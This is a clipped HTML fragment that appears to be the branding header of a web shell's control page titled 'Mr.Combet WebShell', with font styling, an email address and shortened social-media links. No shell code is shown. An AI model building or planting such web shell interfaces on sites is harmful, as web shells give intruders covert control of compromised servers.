...
<style>
@import url('https://fonts.googleapis.com/css2?family=Kaushan+Script&family=Kelly+Slab&display=swap');
body {
    color: black;
    font-size: 0px;
...
<a href="mailto:combetohct@yahoo.com" class="fa fa-envelope border"></a>
<a href="https://bit.ly/3FaKtZd" class="fa fa-facebook border"></a>
<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px #ff0000;"><span>Mr.Combet WebShell</span></a>
<a href="https://bit.ly/3ELU2fs" class="fa fa-whatsapp border"></a>
<a href="https://bit.ly/3Ue74Z0" class="fa fa-telegram border"></a> 
</div>
